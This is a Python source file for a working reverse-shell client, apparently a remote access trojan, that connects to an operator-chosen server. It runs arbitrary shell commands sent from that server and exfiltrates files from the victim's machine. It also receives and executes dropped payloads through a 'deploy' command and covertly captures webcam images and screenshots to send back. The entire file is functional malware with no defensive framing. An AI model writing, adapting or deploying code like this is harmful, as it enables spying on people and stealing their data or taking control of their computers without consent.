import socket
import subprocess
import os
import struct
import zipfile
import cv2
from PIL import ImageGrab
import io

SERVER_IP = 'localhost' #put yo ip 
PORT = 9999

def connect():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, PORT))
        current_dir = os.getcwd()

        while True:
            command = s.recv(1024).decode().strip()
            if not command:
                continue
            if command.lower() in ['exit', 'quit']:
                break

            if command.startswith('cd '):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    current_dir = os.getcwd()
                    output = f"[+] Changed directory to {current_dir}"
                except Exception as e:
                    output = f"[-] Error: {str(e)}"

            elif command.startswith('download '):
                filename = command.split(" ", 1)[1]
                try:
                    with open(filename, 'rb') as file:
                        data = file.read()
                    filesize = len(data)
                    s.sendall(struct.pack('>Q', filesize))
                    s.sendall(data)
                except Exception as e:
                    s.sendall(struct.pack('>Q', 0))
                finally:
                    continue
            
            elif command.startswith('upload '):
                filename = command.split(' ', 1)[1]
                filesize_in_bytes = s.recv(8)
                if not filesize_in_bytes:
                    continue
                filesize = struct.unpack('>Q', filesize_in_bytes)[0]
                try:
                    with open(os.path.basename(filename), 'wb') as file:
                        received_filesize = 0
                        while received_filesize < filesize:
                            data = s.recv(min(4096, filesize - received_filesize))
                            if not data:
                                break
                            file.write(data)
                            received_filesize += len(data)
                    s.sendall('[+] File uploaded successfully'.encode())
                except Exception as e:
                    s.sendall('[-] File upload failed'.encode())
                finally:
                    continue
            
            elif command.startswith('deploy '):
                filename = command.split(' ', 1)[1]
                filesize_in_bytes = s.recv(8)
                if not filesize_in_bytes:
                    continue
                filesize = struct.unpack('>Q', filesize_in_bytes)[0]
                try:
                    with open(os.path.basename(filename + '.zip'), 'wb') as file:
                        received_filesize = 0
                        while received_filesize < filesize:
                            data = s.recv(min(4096, filesize - received_filesize))
                            if not data:
                                break
                            file.write(data)
                            received_filesize += len(data)
                    s.sendall(f'[+] {filename}.zip uploaded successfully. Extracting...'.encode())
                except Exception as e:
                    s.sendall('[-] Upload failed'.encode())
                    continue

                try:
                    with zipfile.ZipFile(filename + '.zip') as file:
                        file.extractall(filename)
                        if filename == 'WHITE_TERROR':
                            os.chdir(filename)
                            os.chdir('DesktopGoose v0.31')
                            path = os.path.join(os.getcwd(), 'GooseDesktop.exe')
                            subprocess.Popen(f'"{path}"', shell=True)
                    s.sendall(f'[+] Deployment successfull. {filename} will now run wild'.encode())
                    
                except Exception as e:
                    s.sendall('[-] Extraction failed'.encode())

                finally:
                    continue

            elif command.startswith('peek '):
                try:
                    cam = cv2.VideoCapture(0)
                    success1, frame = cam.read()
                    cam.release()
                    if success1:
                        success2, buffer = cv2.imencode('.jpg', frame)
                        if success2:
                            data = buffer.tobytes()
                            s.sendall(struct.pack('>Q', len(data)))
                            s.sendall(data)
                        else:
                            s.sendall(struct.pack('>Q', 0))
                    else:
                        s.sendall(struct.pack('>Q', 0))
                except Exception as e:
                    s.sendall(struct.pack('>Q', 0))
                finally:
                    continue

            elif command.startswith('snap '):
                try:
                    screenshot = ImageGrab.grab()

                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='JPEG')
                    data = buffer.getvalue()

                    s.sendall(struct.pack('>Q', len(data)))
                    s.sendall(data)
                except Exception as e:
                    s.sendall(struct.pack('>Q', 0))
                finally:
                    continue


            else:
                try:
                    #print(command)
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, cwd=current_dir)
                    output = result.decode()
                except subprocess.CalledProcessError as e:
                    output = e.output.decode()

            s.sendall(output.encode())

if __name__ == '__main__':
    connect()
